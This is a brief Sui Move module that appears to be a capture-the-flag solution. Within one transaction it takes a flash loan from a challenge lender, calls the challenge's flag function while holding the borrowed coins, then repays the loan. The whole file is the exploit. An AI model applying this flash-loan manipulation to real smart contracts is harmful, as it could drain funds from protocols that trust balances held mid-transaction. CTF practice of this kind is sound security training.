module ctf_wcw::hack { 
    use sui::coin::Coin;
    use sui::tx_context::{TxContext};
    use movectf::flash::{Self, FlashLender, Receipt, FLASH};

    public entry fun get_flag(leader: &mut FlashLender, ctx: &mut TxContext) {
        let (loan, receipt):(Coin<FLASH>, Receipt) = flash::loan(leader, 1000, ctx);

        flash::get_flag(leader, ctx);

        flash::repay(leader, loan);
        flash::check(leader, receipt);
    }
}